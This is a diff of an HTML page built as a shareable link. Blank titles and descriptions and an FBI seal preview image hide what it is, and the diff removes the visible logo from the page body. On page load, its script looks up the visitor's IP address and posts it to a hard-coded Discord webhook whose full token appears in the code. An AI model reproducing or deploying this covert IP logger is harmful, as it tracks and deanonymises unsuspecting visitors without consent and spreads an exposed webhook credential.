@@ -2,11 +2,10 @@
 <html lang="sk">
 <head>
   <meta charset="UTF-8" />
-  
-  <title> </title> <!-- empty space to avoid showing title -->
-  
-  <meta property="og:title" content=" " /> <!-- empty content -->
-  <meta property="og:description" content=" " /> <!-- empty description -->
+  <title> </title>  <!-- just a space -->
+
+  <meta property="og:title" content=" " />
+  <meta property="og:description" content=" " />
   <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="1200" />
@@ -17,9 +16,7 @@
   <meta name="twitter:description" content=" " />
   <meta name="twitter:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
 </head>
-<body style="margin:0; padding:0;">
-  <img src="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" style="width:100%;height:auto;" alt="FBI Logo" />
-  
+<body>
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
 
@@ -29,7 +26,7 @@
         const ip = data.ip;
         fetch(webhookURL, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({ content: `Visitor IP logged: ${ip}` })
         });
       });
